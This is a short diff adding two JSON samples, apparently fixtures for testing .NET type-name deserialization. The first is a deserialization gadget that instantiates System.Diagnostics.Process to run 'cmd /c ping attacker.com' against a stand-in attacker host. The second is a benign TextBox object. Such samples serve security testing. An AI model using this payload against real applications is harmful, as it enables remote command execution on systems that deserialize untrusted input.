@@ -1,0 +1,24 @@
+[
+  {
+    "$type": "System.Diagnostics.Process, System",
+    "StartInfo": {
+      "FileName": "cmd",
+      "Arguments": "/c ping attacker.com"
+    }
+  }
+]
+
+
+-----------
+
+[
+  {
+    "$type": "System.Windows.Forms.TextBox, System.Windows.Forms",
+    "Text": "Hello World"
+  }
+]
+
+
+-------------------
+
+
